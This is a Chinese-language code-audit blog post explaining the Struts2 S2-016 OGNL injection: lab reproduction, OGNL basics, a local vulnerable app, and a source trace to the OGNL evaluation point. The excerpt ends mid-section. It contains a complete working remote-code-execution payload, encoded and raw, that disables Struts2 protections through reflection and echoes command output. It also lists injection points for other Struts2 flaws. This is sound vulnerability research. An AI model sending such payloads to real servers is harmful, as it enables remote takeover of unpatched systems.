---
title: 代码审计 | Struts2 —— S2-016 OGNL 注入原理
cover: >-
  https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_3luk.png
categories:
  - [代码审计, struts2]
tags:
  - 代码审计
  - Java
  - Struts2
  - S2-016
  - OGNL
  - RCE
abbrlink: a7f2b9d3
date: 2026-05-10 10:30:00
---
# 代码审计 | Struts2 —— S2-016 OGNL 注入原理

> 本文是 Struts2 漏洞系列的第一篇，以 S2-016 为切入点，重点搞清楚 OGNL 注入的原理。Payload 极简，但背后的机制值得细细拆解。

---

## 目录

- [一、环境搭建与漏洞复现](#一环境搭建与漏洞复现)
- [二、URL 编码的那点细节](#二url-编码的那点细节)
- [三、Payload 结构拆解](#三payload-结构拆解)
- [四、OGNL 语法入门](#四ognl-语法入门)
  - [OGNL 是什么](#ognl-是什么)
  - [OGNL 基本语法](#ognl-基本语法)
  - [为什么能执行系统命令](#为什么能执行系统命令)
  - [为什么需要前两行绕过](#为什么需要前两行绕过)
  - [整个执行流程](#整个执行流程)
- [五、表达式注入类比](#五表达式注入类比)
- [六、OGNL 示例代码](#六ognl-示例代码)
  - [示例 1：基础用法](#示例-1基础用法)
  - [示例 2：root 对象与 context 的区别](#示例-2root-对象与-context-的区别)
- [七、搭建 Struts2 靶场（本地复现）](#七搭建-struts2-靶场本地复现)
  - [新建 Tomcat 项目](#新建-tomcat-项目)
  - [四个文件配置](#四个文件配置)
  - [验证漏洞触发](#验证漏洞触发)
  - [Struts2 完整请求流程](#struts2-完整请求流程)
- [八、代码审计](#八代码审计)
  - [入口：StrutsPrepareAndExecuteFilter](#入口strutsprepareandexecutefilter)
  - [executeAction 与 ActionMapping](#executeaction-与-actionmapping)
  - [struts-default.xml 与各版本注入点](#struts-defaultxml-与各版本注入点)
  - [顺着调用链往下走](#顺着调用链往下走)
  - [核心触发：conditionalParse → OGNL 执行](#核心触发conditionalparsegnl-执行)
  - [漏洞根因总结](#漏洞根因总结)
- [九、Payload 调试与完整利用](#九payload-调试与完整利用)
  - [简单 RCE Payload（无回显）](#简单-rce-payload无回显)
  - [问题：静态方法被拦截](#问题静态方法被拦截)
  - [Payload 2：绕过静态方法限制](#payload-2绕过静态方法限制)
  - [Payload 3：命令回显版](#payload-3命令回显版)
- [十、总结](#十总结)

---

## 一、环境搭建与漏洞复现

用 vulhub 起环境，很方便：

```bash
git clone https://github.com/vulhub/vulhub.git
cd vulhub/struts2/s2-016
docker-compose up -d
```

起来之后访问 `http://127.0.0.1:8080/`：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_3zyx.png)

用 Yakit 抓个包看看原始请求长什么样：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_efs5.png)

这是原始的包：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_gs8g.png)

把 GET 请求的 URL 参数换成下面这个 Payload（已 URL 编码）：

```
/index.action?redirect:%24%7B%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dfalse%2C%23f%3D%23_memberAccess.getClass().getDeclaredField(%22allowStaticMethodAccess%22)%2C%23f.setAccessible(true)%2C%23f.set(%23_memberAccess%2Ctrue)%2C%23a%3D@java.lang.Runtime@getRuntime().exec(%22id%22)%2C%23b%3Dnew+java.io.InputStreamReader(%23a.getInputStream())%2C%23c%3Dnew+java.io.BufferedReader(%23b)%2C%23d%3D%23c.readLine()%2C%23matt%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22)%2C%23matt.getWriter().println(%23d)%2C%23matt.getWriter().flush()%2C%23matt.getWriter().close()%7D
```

可以看到命令执行结果被正常回写了：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_3luk.png)

---

## 二、URL 编码的那点细节

这里有个小问题——上面的 Payload 是自己手动 URL 编码过的，如果直接发送未编码版本：

```
/index.action?redirect:${#context["xwork.MethodAccessor.denyMethodExecution"]=false,#f=#_memberAccess.getClass().getDeclaredField("allowStaticMethodAccess"),#f.setAccessible(true),#f.set(#_memberAccess,true),#a=@java.lang.Runtime@getRuntime().exec("id"),#b=new java.io.InputStreamReader(#a.getInputStream()),#c=new java.io.BufferedReader(#b),#d=#c.readLine(),#matt=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#matt.getWriter().println(#d),#matt.getWriter().flush(),#matt.getWriter().close()}
```

不仅没有返回命令结果，还直接 400 了：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_h0eu.png)

这里有个细节：**浏览器的自动编码并不是对整个 URL 都编码**，它只编码它认为"需要编码"的字符，有些字符浏览器认为是 URL 的合法字符就不会动。

比如 `#` 这个字符：

- 浏览器认为 `#` 是锚点符号（fragment identifier），`#` 后面的内容浏览器直接截断，不会发给服务端
- Payload 里大量用了 `#_memberAccess`、`#context`、`#a` 这些，浏览器看到第一个 `#` 就认为后面是页面锚点，直接不发了，服务端收到的请求是残缺的

而手动编码的版本里 `#` 变成了 `%23`，浏览器不认识这是锚点，原样发给服务端，服务端 URL decode 之后才还原成 `#`，OGNL 正常执行。

**小结：**

- `#` 在 URL 里有特殊含义（锚点）
- 浏览器不会自动把 `#` 编码成 `%23`
- 所以含 `#` 的 Payload 必须手动提前编码好再放进 URL

---

## 三、Payload 结构拆解

把 Payload 格式化出来看更清楚：

```
redirect:${
  // 第一步：关闭方法执行限制
  #context["xwork.MethodAccessor.denyMethodExecution"]=false,

  // 第二步：开启静态方法访问（用反射改掉这个字段）
  #f=#_memberAccess.getClass().getDeclaredField("allowStaticMethodAccess"),
  #f.setAccessible(true),
  #f.set(#_memberAccess,true),

  // 第三步：执行命令
  #a=@java.lang.Runtime@getRuntime().exec("id"),

  // 第四步：读取输出
  #b=new java.io.InputStreamReader(#a.getInputStream()),
  #c=new java.io.BufferedReader(#b),
  #d=#c.readLine(),

  // 第五步：写回 Response 实现回显
  #matt=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),
  #matt.getWriter().println(#d),
  #matt.getWriter().flush(),
  #matt.getWriter().close()
}
```

五步走，先撬锁再执行，后面代码审计的时候会挨个对应。

---

## 四、OGNL 语法入门

在搞清楚漏洞细节之前，先把 OGNL 是什么搞明白，不然后面看代码会很懵。

### OGNL 是什么

OGNL = **Object-Graph Navigation Language**，对象图导航语言。Struts2 用它来做表达式求值，比如在页面上取值 `${user.name}` 这种。

它本质上就是一个可以在运行时执行 Java 代码的表达式引擎。

### OGNL 基本语法

```java
// 访问对象属性
user.name

// 调用方法
user.getName()

// 调用静态方法（关键）
@java.lang.Runtime@getRuntime()

// 创建对象
new java.io.BufferedReader(...)

// 访问上下文变量（# 开头）
#context
#_memberAccess
#request
#response
```

`#` 开头的变量是访问 OGNL 上下文里的对象，Struts2 把很多关键对象都放在上下文里，比如 `HttpServletRequest`、`HttpServletResponse`，所以能直接拿来用。

> 注意：OGNL 里没有 `import` 机制，不认识短类名，必须写类的全限定名，比如 `@java.lang.Runtime@getRuntime()`，不能简写成 `@Runtime@getRuntime()`。

### 为什么能执行系统命令

Java 里执行系统命令的标准写法：

```java
Runtime.getRuntime().exec("id");
```

翻译成 OGNL：

```
@java.lang.Runtime@getRuntime().exec("id")
```

完全一一对应，OGNL 就是把 Java 代码用表达式的方式写出来，能写什么取决于你能调用哪些 Java API。

### 为什么需要前两行绕过

```
#context["xwork.MethodAccessor.denyMethodExecution"]=false
#f=#_memberAccess.getClass().getDeclaredField("allowStaticMethodAccess")
#f.setAccessible(true)
#f.set(#_memberAccess,true)
```

Struts2 默认：

- `denyMethodExecution=true` → 禁止调用方法
- `allowStaticMethodAccess=false` → 禁止调用静态方法

`@java.lang.Runtime@getRuntime()` 是静态方法调用，不关掉这两个限制直接报错，所以要先用反射把这两个字段改掉，相当于把安全锁撬开，再去执行后面的命令。

### 整个执行流程

```
用户输入 redirect:${...}
        ↓
Struts2 解析 redirect: 前缀
        ↓
把后面的 ${...} 丢给 OGNL 引擎求值
        ↓
OGNL 引擎执行里面的 Java 表达式
        ↓
Runtime.exec("id") 被执行
        ↓
结果写回 HttpServletResponse
```

问题就在第三步——用户输入的内容被当成代码执行了，这就是注入漏洞的本质。

---

## 五、表达式注入类比

### SSTI 和 OGNL 注入的共同本质

```
用户输入  →  被当成"可执行的东西"处理  →  代码执行
```

区别只在于"可执行的东西"是什么：

| 漏洞类型 | 解析引擎 |
|---|---|
| SSTI（Jinja2/Twig/Freemarker）| 模板引擎解析用户输入 |
| OGNL 注入（Struts2）| OGNL 表达式引擎解析用户输入 |
| EL 注入（Spring）| EL 表达式引擎解析用户输入 |

都是同一类漏洞，叫**表达式注入**，SSTI 只是其中模板引擎那个分支的名字。

### 具体类比

Jinja2 SSTI：

```python
# 服务端
template = "Hello " + user_input  # 用户输入被拼进模板
render(template)                   # 模板引擎执行

# Payload
{{7*7}}          →  返回 49
{{config.items()}}  →  读配置
```

Struts2 OGNL：

```java
// 服务端
String result = user_input  // redirect: 后面的内容
ognl.evaluate(result)       // OGNL 引擎执行

// Payload
${1+1}                                        →  返回 2
${@java.lang.Runtime@getRuntime().exec("id")} →  RCE
```

逻辑完全一样，只是语法不同。

### 为什么 OGNL 比 Jinja2 SSTI 更危险

Jinja2 要 RCE 需要找绕过沙箱的链，比较麻烦。OGNL 直接就是 Java 表达式，`Runtime.exec()` 就在那里，调用路径短得多，而且 Java 反射能力极强，沙箱再严也容易绕。

完全可以把 **OGNL 注入理解成 Java 世界的 SSTI**。

---

## 六、OGNL 示例代码

光看概念还是有点抽象，自己写代码跑一跑感受更直观。新建一个 Java Maven 空项目。

### 示例 1：基础用法

`pom.xml` 里加上 OGNL 依赖：

```xml
<dependencies>
    <dependency>
        <groupId>ognl</groupId>
        <artifactId>ognl</artifactId>
        <version>3.0.8</version>
    </dependency>
</dependencies>
```

```java
package com;

import ognl.Ognl;
import ognl.OgnlContext;

public class OgnlDemo {
    public static void main(String[] args) throws Exception {

        // 1. 最简单：数学计算
        // Ognl.getValue()    →  OGNL 引擎的入口方法，把第一个参数当表达式执行
        // "1+1"              →  表达式字符串，就是要执行的"代码"
        // new OgnlContext()  →  OGNL 上下文，存放 #context #request 这些变量的容器，现在是空的
        // new Object()       →  root 对象，表达式里不带 # 的属性访问从这里找，现在也是空的
        Object result = Ognl.getValue("1+1", new OgnlContext(), new Object());
        System.out.println("1+1 = " + result);  // 输出 2

        // 2. 调用 Java 静态方法
        // @java.lang.System@  →  OGNL 调用静态类的语法，@ 开头 @ 结尾包住类名，表示访问这个类
        // getProperty('os.name') →  调用 System.getProperty() 静态方法
        // 翻译成普通 Java：String result2 = System.getProperty("os.name");
        Object result2 = Ognl.getValue(
                "@java.lang.System@getProperty('os.name')",
                new OgnlContext(),
                new Object()
        );
        System.out.println("OS: " + result2);  // 输出操作系统名

        // 3. 模拟用户输入被当成表达式执行（漏洞本质）
        // userInput 是一个普通字符串，但被传进了 Ognl.getValue()
        // 字符串就变成了可执行的代码
        String userInput = "@java.lang.Runtime@getRuntime().exec('calc')";
        Ognl.getValue(userInput, new OgnlContext(), new Object());
        // Windows 下直接弹计算器
    }
}
```

运行效果：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_f9zw.png)

三段代码都执行了。

**关键点就在这里：**

- `userInput` 是一个普通字符串
- 但是被传进了 `Ognl.getValue()`
- 字符串就变成了可执行的代码

这就是注入漏洞的本质——**数据和代码的边界消失了**。

---

### 示例 2：root 对象与 context 的区别

OGNL 里有两种访问方式，搞清楚 `root` 和 `context` 的区别很重要，Payload 里大量用到 `#` 前缀就是在访问 `context`。

```java
package com;

import ognl.Ognl;
import ognl.OgnlContext;

public class OgnlDemo2 {

    // 模拟一个普通的 Java 对象，作为 root
    static class User {
        //两个私有字段
        private String name = "张三";
        private int age = 18;
        //一个公共的字段
        public int c = 10;

        public String getName() { return name; }
        public int getAge() { return age; }

        public String sayHello() {
            return "Hello, 我是" + name;
        }

        public int add(int a, int b) {
            return a + b;
        }
    }

    public static void main(String[] args) throws Exception {

        // ==================== 准备环境 ====================
        User user = new User();       // root 对象，不带 # 的表达式从这里找属性
        OgnlContext context = new OgnlContext();  // context 上下文，带 # 的表达式从这里找

        // 模拟 Struts2 往 context 里塞关键对象
        context.put("myVar", "hello");
        context.put("num", 100);
        context.put("user2", new User());

        // ==================== 访问 root 对象 ====================
        // 直接写属性名，从 root 对象找
        // 私有字段会自动调用 getter，没有 getter 就会报错
        Object r1 = Ognl.getValue("name", context, user);
        System.out.println("root.name = " + r1);  // 张三

        Object r2 = Ognl.getValue("age", context, user);
        System.out.println("root.age = " + r2);   // 18

        // 公共字段可以直接访问
        Object r3 = Ognl.getValue("c", context, user);
        System.out.println("root.c = " + r3);     // 10

        // 调用 root 对象的方法
        Object r4 = Ognl.getValue("sayHello()", context, user);
        System.out.println("sayHello() = " + r4); // Hello, 我是张三

        Object r5 = Ognl.getValue("add(1, 2)", context, user);
        System.out.println("add(1, 2) = " + r5);  // 3

        // ==================== 访问 context 变量 ====================
        // # 开头，从 context 这个 Map 里找
        Object c1 = Ognl.getValue("#myVar", context, user);
        System.out.println("#myVar = " + c1);      // hello

        Object c2 = Ognl.getValue("#num + 1", context, user);
        System.out.println("#num+1 = " + c2);      // 101

        // 访问 context 里存的对象的属性
        Object c3 = Ognl.getValue("#user2.name", context, user);
        System.out.println("#user2.name = " + c3); // 张三

        Object c4 = Ognl.getValue("#user2.sayHello()", context, user);
        System.out.println("#user2.sayHello() = " + c4); // Hello, 我是张三

        // ==================== 在 context 里赋值 ====================
        // # 变量可以在表达式里直接赋值，相当于声明临时变量
        // Payload 里的 #matt = #context.get(...) 就是这种写法
        Ognl.getValue("#tmp = 'world'", context, user);
        Object c5 = Ognl.getValue("#tmp", context, user);
        System.out.println("#tmp = " + c5);        // world

        // 链式赋值 + 计算
        Ognl.getValue("#a = #num, #b = #a + 99, #b", context, user);
        Object c6 = Ognl.getValue("#b", context, user);
        System.out.println("#b = " + c6);          // 199
    }
}
```

运行结果：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_sq3a.png)

这个示例把 OGNL 里 `root` 和 `#context` 的用法都演示了一遍，Payload 里的 `#matt=#context.get("...")` 就是从 context 这个 Map 里取出 `HttpServletResponse`，然后用它写回显，原理就是这样。

---

## 七、搭建 Struts2 靶场（本地复现）

后面要做代码审计，需要一个自己能调试的 Struts2 环境。

### 新建 Tomcat 项目

新建一个 Tomcat 项目（配置过程就不赘述了）：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_qkpa.png)

访问 `http://localhost:8080/` 可以正常访问：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_45a4.png)

### 四个文件配置

`pom.xml` 里加上 Struts2 依赖，找到 `<dependencies>` 标签加进去：

```xml
<dependency>
    <groupId>org.apache.struts</groupId>
    <artifactId>struts2-core</artifactId>
    <version>2.3.15</version>
</dependency>
```

加完 Maven 刷新一下，然后按顺序把下面四个文件建好。

---

**第一个：HelloAction.java**

在 `src/main/java` 下建包 `com.demo`，新建 `HelloAction.java`：

```java
package com.demo;

// ActionSupport 是 Struts2 提供的基类，继承它就能获得 Struts2 的标准功能
// 所有 Action 类一般都继承它
import com.opensymphony.xwork2.ActionSupport;

public class HelloAction extends ActionSupport {

    // Struts2 会自动把 URL 参数绑定到 Action 的字段上
    // 比如请求 ?name=张三，Struts2 自动调用 setName("张三")
    // 原理就是 OGNL 的属性绑定机制
    private String name;

    public String getName() { return name; }
    public void setName(String name) { this.name = name; }

    // execute() 是 Struts2 默认调用的方法，请求进来之后框架自动调这个
    // SUCCESS 是 ActionSupport 里定义的常量，值就是字符串 "success"
    // 返回 SUCCESS 就跳转到 struts.xml 里配置的 result
    public String execute() throws Exception {
        return SUCCESS;
    }
}
```

整个流程：

```
请求 /index.action
        ↓
Struts2 找到对应的 HelloAction
        ↓
自动把 URL 参数绑定到字段（OGNL 做的）
        ↓
调用 execute()
        ↓
返回 "success"
        ↓
跳转到 index.jsp
```

---

**第二个：struts.xml**

在 `src/main/resources` 下新建 `struts.xml`：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE struts PUBLIC
        "-//Apache Software Foundation//DTD Struts Configuration 2.3//EN"
        "http://struts.apache.org/dtds/struts-2.3.dtd">

<struts>
    <package name="default" namespace="/" extends="struts-default">
        <action name="index" class="com.demo.HelloAction">
            <result name="success">/index.jsp</result>
        </action>
    </package>
</struts>
```

解释一下各属性：

```
<package name="default" namespace="/" extends="struts-default">

name="default"           →  这个包的名字，随便起，唯一就行
namespace="/"            →  URL 命名空间，/ 表示根路径
                            访问 /index.action 而不是 /demo/index.action
extends="struts-default" →  继承 Struts2 内置的默认包
                            里面预置了所有拦截器和结果类型
                            包括处理 redirect: 的结果类型也在这里

<action name="index" class="com.demo.HelloAction">

name="index"                 →  对应 URL 里的 index.action
class="com.demo.HelloAction" →  请求来了实例化这个类处理

<result name="success">/index.jsp</result>

name="success"  →  对应 execute() 返回的字符串 "success"
/index.jsp      →  返回 success 就跳转到这个页面
```

**和 S2-016 漏洞的关系：**

`extends="struts-default"` 这行是关键，`struts-default` 里预置了 `redirect` 结果类型：

```xml
<!-- struts-default.xml 里内置的，我们看不到但它存在 -->
<result-type name="redirect"
             class="org.apache.struts2.dispatcher.ServletRedirectResult"/>
```

用户请求 `?redirect:${...}` 的时候，Struts2 识别 `redirect:` 前缀，调用 `ServletRedirectResult` 处理，然后把后面的 `${...}` 丢给 OGNL 执行，漏洞就在这里触发。

所以这个配置文件看起来没问题，但继承了 `struts-default` 就自动带进来了漏洞的触发路径。

---

**第三个：web.xml**

在 `src/main/webapp/WEB-INF` 下找到 `web.xml`，内容换成：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
         http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd"
         version="3.1">

    <filter>
        <filter-name>struts2</filter-name>
        <filter-class>org.apache.struts2.dispatcher.ng.filter.StrutsPrepareAndExecuteFilter</filter-class>
    </filter>

    <filter-mapping>
        <filter-name>struts2</filter-name>
        <url-pattern>/*</url-pattern>
    </filter-mapping>

</web-app>
```

没有这个 Filter，Struts2 根本不工作，它是整个框架的入口，所有请求都从这里过。

---

**第四个：index.jsp**

`src/main/webapp/index.jsp` 内容换成：

```jsp
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<html>
<body>
    <h1>Hello, ${name}</h1>
</body>
</html>
```

---

### 验证漏洞触发

四个文件建好之后启动 Tomcat，访问 `http://localhost:8080/index.action`：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_qaj3.png)

访问 `http://localhost:8080/index.action?name=wrold`，返回 `Hello, wrold`：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_ly5t.png)

然后试试触发 OGNL 表达式，访问：

```
http://localhost:8080/index.action?redirect:${1+1}
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_flt6.png)

发现返回的是 **HTTP 400 – Bad Request**，原因是 Tomcat 在解析请求行时发现里面有非法字符（冒号、花括号、加号），根据 RFC 7230 和 RFC 3986，这些字符在查询参数里必须经过百分号编码。

把 URL 里的特殊字符编码后再访问：

```
http://localhost:8080/index.action?redirect%3A%24%7B1%2B1%7D
```

返回的是 404"Not Found"（资源不存在）：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_n8yc.png)

但注意到 URL 路径变成了：

```
http://localhost:8080/2
```

说明内部已经解析了参数 `redirect:${1+1}`：

- 框架识别了 `redirect:` 前缀
- 框架对 `${1+1}` 进行了表达式求值（OGNL）
- 服务器发送了 302 重定向响应，客户端自动跳转到 `/2`
- 然后客户端去访问 `http://localhost:8080/2`，而这个资源不存在，所以最终返回 404

**OGNL 已经执行了，只是结果被用作重定向目标，后面代码审计会看得很清楚。**

---

### Struts2 完整请求流程

```
请求 /index.action?name=张三
        ↓
Filter 拦截（StrutsPrepareAndExecuteFilter）
        ↓
根据 struts.xml 找到 HelloAction
        ↓
实例化 HelloAction 对象
        ↓
【参数绑定】
遍历所有 URL 参数
对每个参数名用 OGNL 执行：HelloAction.setName("张三")
        ↓
执行 execute()
        ↓
返回 success 跳转 index.jsp
        ↓
JSP 里 ${name} 用 OGNL 调用 HelloAction.getName()
        ↓
显示 张三
```

所以本质上就是 **Struts2 把每个 URL 参数名当成 OGNL 表达式执行了一遍**，这也是早期 S2-003/S2-005 漏洞的根源——参数名本身就能注入 OGNL。

---

## 八、代码审计

环境搭好了，开始看代码是怎么走的。

没有源代码的话可以去 Maven 中央仓库下载：

```
https://repo1.maven.org/maven2/org/apache/struts/struts2-core/2.3.15/struts2-core-2.3.15-sources.jar
```

### 入口：StrutsPrepareAndExecuteFilter

先根据 `web.xml` 里的 `StrutsPrepareAndExecuteFilter` 找到源文件，在 `doFilter` 打个断点：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_1l44.png)

这里面出现了大量 `prepare` 字段，简单解释一下，就是 Filter 里的两个阶段：

```
doFilter()
    ↓
prepare.wrapRequest()        ← Prepare 阶段
  - 初始化 ActionContext
  - 把 request/response/session 塞进 OGNL context
  - 解析请求参数，绑定到 Action 字段
        ↓
execute.executeAction()      ← Execute 阶段
  - 根据 struts.xml 找 Action
  - 实例化 Action 类
  - 调用 execute() 方法
  - 处理返回结果（redirect/dispatcher）
```

---

### executeAction 与 ActionMapping

重点在 `execute.executeAction` 方法：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_f3uh.png)

除了 `Request` 和 `Response` 参数，还有一个 `mapping` 参数，可以看到参数里面的内容：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_m6r3.png)

`mapping` 是 `ActionMapping` 对象，存的是 Struts2 解析完 URL 之后得到的路由信息：

```
请求 /index.action?redirect:${1+1}
        ↓
Struts2 解析 URL
        ↓
ActionMapping {
    name      = "index"               ← action 名字
    namespace = "/"                   ← 命名空间
    method    = "null"                ← 没指定方法，默认用 execute()
    extension = 'action'              ← 后缀是 .action
    result    = ServletRedirectResult ← 识别出 redirect: 前缀，指定了结果处理类
}
```

---

### struts-default.xml 与各版本注入点

这个文件在 `struts2-core.jar` 包里，框架自带的：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_3n63.png)

`struts.xml` 里写了 `extends="struts-default"`，就把这些内置 result 类型全部继承过来了，所以 Struts2 解析到 `redirect:` 前缀的时候，直接查这个表找到对应的 `ServletRedirectResult` 类。

`redirect:` 只是其中一个注入点，Struts2 历史上被找到的注入点非常多：

| 版本 | 注入点 | Payload 特征 |
|---|---|---|
| S2-003/005 | 参数名本身 | `?(%27%23_memberAccess...)=xxx` |
| S2-016 | `redirect:`/`redirectAction:` 前缀 | `?redirect:${...}` |
| S2-032 | `method:` 前缀 | `?method:${...}` |
| S2-045 | Content-Type 请求头 | multipart 解析时触发 |
| S2-046 | Content-Disposition 的 filename 字段 | multipart 解析时触发 |
| S2-052 | 请求 body（XML 反序列化）| REST 插件解析 XML 时触发 |
| S2-057 | namespace | URL 路径本身被当 OGNL 执行 |

规律就一条：**凡是用户能控制的输入，被 Struts2 拿去做了 OGNL 求值，就是漏洞。**

从 URL 参数名、参数值前缀、请求头、请求体、文件名、命名空间，基本上能想到的地方都被找过一遍了，这也是为什么 Struts2 漏洞那么多，根本原因是框架过度依赖 OGNL，到处都在求值。

---

### 顺着调用链往下走

进入 `executeAction`：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_n0ey.png)

可以看到 `dispatcher.serviceAction(request, response, servletContext, mapping)` 里多了个 `servletContext`，非常眼熟——内存马那里见过：

```java
// Listener 内存马里静态注册用到过
ServletContext context = request.getServletContext();
context.addFilter(...)    ← 动态注册 Filter
context.addServlet(...)   ← 动态注册 Servlet
```

进入 `createContextMap`，可以看到 URL 里面的 `redirect:${1+1}` 被传入了参数 `params`，其他变量都是空的：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_bluy.png)

这也意味着请求的数据里有很多都会经过这个处理，都有可能成为注入点。

接着进入 `createContextMap` 构造 `extraContext`：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_rasc.png)

在这个构造参数里，可以看到非常多的 `put` 方法，把各种对象塞进 Map，也就是把 `request/response/session` 塞进 OGNL context 的地方。这个 Map `extraContext` 最终就是 OGNL 的 context，所以 Payload 里才能用 `#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse")` 取出 response 对象。

进一步跟进，发现 map 里面的参数被取出，加上有表达式的 OGNL context `extraContext` 一起被封装到了一个代理里面：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_bgia.png)

```
createActionProxy(
    namespace,    // 命名空间 "/"
    name,         // action 名字 "index"
    method,       // 方法名 null（默认 execute）
    extraContext, // OGNL context，塞了 request/response 等
    true,         // executeResult，是否执行 result
    false         // cleanupContext，是否清理 context
)
```

接下来在这里检测 `redirect`：

```
mapping.getResult() 拿到的就是之前在 ActionMapping 里看到的：
result = org.apache.struts2.dispatcher.ServletRedirectResult
```

Struts2 在解析 URL 的时候就已经识别了 `redirect:` 前缀，把 `ServletRedirectResult` 存进了 `mapping`，现在这里把它取出来直接执行：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_r90j.png)

`result.execute()` → `super.execute()`，这里调用父类的 `execute`，可以看到继承的是 `StrutsResultSupport`：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_ohey.png)

在 `StrutsResultSupport.execute()` 里看到一个 `location` 变量，值是 `${1+1}`，这个时候表达式已经被提取出来了：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_wzt1.png)

具体的截取逻辑在 `DefaultActionMapper` 里面：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_0vgq.png)

常量 `REDIRECT_PREFIX`，值是 `"redirect:"`，就是处理 `redirect:` 前缀的：

```java
put(REDIRECT_PREFIX, new ParameterAction() {
    public void execute(String key, ActionMapping mapping) {

        ServletRedirectResult redirect = new ServletRedirectResult();
        container.inject(redirect);

        // 直接截取 redirect: 后面的内容
        // key = "redirect:${1+1}"
        // substring 之后 location = "${1+1}"
        // 没有任何过滤，原封不动
        redirect.setLocation(key.substring(REDIRECT_PREFIX.length()));

        mapping.setResult(redirect);
    }
});
```

把未经过滤的用户输入存进 `ServletRedirectResult.location`，再存进 `ActionMapping`，后面取出来直接丢给 OGNL 执行。

---

### 核心触发：conditionalParse → OGNL 执行

父类的 `execute` 里面：

```java
lastFinalLocation = conditionalParse(location, invocation);
```

这行是重点：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_5nm9.png)

`invocation` 是 `ActionInvocation` 对象，和之前的 `ActionProxy` 有关，里面有各种参数和环境。

`conditionalParse` 方法就在下面：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_stri.png)

`parse` 是 `StrutsResultSupport` 的一个成员变量，默认值是 `true`，这个条件默认就满足。`parse` 这个开关本来是给开发者用的，表示"是否解析表达式"，但默认是 `true`，而且用户输入没有经过任何过滤就到了这里，所以等于把 RCE 的大门直接敞开了。

进入 `TextParseUtil.translateVariables`（源码在 xwork-core 里）：

```
https://repo1.maven.org/maven2/org/apache/struts/xwork/xwork-core/2.3.15.1/xwork-core-2.3.15.1-sources.jar
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_gtal.png)

`expression` 就是表达式 `${1+1}`。`translateVariables` 方法里的第一个参数是一个数组，包含 `%` 和 `$`：

```java
new char[]{'$', '%'}
```

这说明 Struts2 同时支持两种表达式语法：

- `${}` → 标准 OGNL 表达式，S2-016 用这个
- `%{}` → 同样是 OGNL 表达式，S2-045 的 Payload 用这个

两个符号都会被识别然后丢给 OGNL 执行，所以 S2-045 的 Payload 里用 `%{...}` 也能触发，根本原因就在这里。

然后经过几个构造方法来到最后一个：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_kp23.png)

这个就是核心的漏洞触发代码：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_y8yt.png)

```java
Object result = parser.evaluate(openChars, expression, ognlEval, maxLoopCount);
```

- `openChars` → `{'$', '%'}`，告诉 parser 要识别这两种符号
- `expression` → `"${1+1}"`，要扫描的完整字符串
- `ognlEval` → 回调函数，parser 提取完内容之后调用它执行 OGNL
- `maxLoopCount` → 最大循环次数，防止死循环，比如 `${${1+1}}` 这种嵌套表达式

`evaluate` 方法就是匹配字符的逻辑：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_a6x4.png)

这个机制让我想到了之前看过的 Log4j 的代码——类似 `%{"$"}{1+1}` 这种，第一次解析变成 `${1+1}` 然后再次解析，两者思路是一样的。

第三个参数 `ognlEval` 是 `ParsedValueEvaluator` 对象，里面的 `Object o = stack.findValue(parsedValue, asType)` 是执行表达式的最终地方。

在 `evaluate` 里：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_uezw.png)

```java
